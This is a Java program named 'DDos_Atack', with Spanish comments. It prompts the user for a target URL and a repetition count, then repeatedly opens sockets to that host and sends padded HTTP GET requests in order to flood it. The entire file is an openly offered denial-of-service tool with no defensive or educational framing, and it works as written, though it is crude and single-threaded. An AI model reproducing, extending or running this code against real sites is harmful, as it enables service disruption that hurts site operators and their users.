package DDos_Atack;

import java.io.IOException; // Importación para manejar excepciones de entrada/salida
import java.io.OutputStream; // Importación para escribir datos en un flujo de salida
import java.net.InetAddress; // Importación para trabajar con direcciones IP
import java.net.Socket; // Importación para establecer conexiones de socket
import java.net.URI; // Importación para analizar y manipular URIs
import java.net.URISyntaxException; // Importación para manejar excepciones relacionadas con URIs
import java.util.Scanner; // Importación para leer la entrada del usuario mediante Scanner

public class DDos_Atack {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        
        // Solicitar al usuario si desea realizar un ataque DDoS
        System.out.print("¿Desea realizar un ataque DDoS? (s/n): ");
        String respuesta = scanner.nextLine();

        if (respuesta.equalsIgnoreCase("s")) {
            // Solicitar la URL completa del host al que se dirigirá el ataque
            System.out.print("Ingresa la URL completa del host: ");
            String url = scanner.nextLine();

            try {
                // Crear una instancia de la clase URI para analizar la URL proporcionada
                URI uri = new URI(url);
                String host = uri.getHost();
                int port = uri.getPort();
                
                // Si no se especificó un puerto en la URL, se establece el puerto predeterminado según el esquema (http o https)
                if (port == -1) {
                    port = uri.getScheme().equalsIgnoreCase("https") ? 443 : 80;
                }

                // Obtener la dirección IP del host
                InetAddress inetAddress = InetAddress.getByName(host);

                // Solicitar el número de repeticiones para el ataque
                System.out.print("Ingresa el número de repeticiones: ");
                int repeticiones = scanner.nextInt();

                // Realizar el ataque DDoS el número de veces especificado
                for (int i = 0; i < repeticiones; i++) {
                    // Crear un socket y conectar al host en el puerto especificado
                    Socket socket = new Socket(inetAddress, port);
                    OutputStream outputStream = socket.getOutputStream();

                    // Preparar los datos de solicitud
                    String requestData = "X".repeat(1024);
                    String request = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
                    String payload = request + requestData;
                    byte[] payloadBytes = payload.getBytes();

                    // Enviar la solicitud al host
                    outputStream.write(payloadBytes);
                    outputStream.flush();

                    // Cerrar el socket
                    socket.close();
                }
            } catch (URISyntaxException e) {
                System.out.println("URL inválida: " + url);
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else {
            System.out.println("SALIENDO...");
        }
    }
}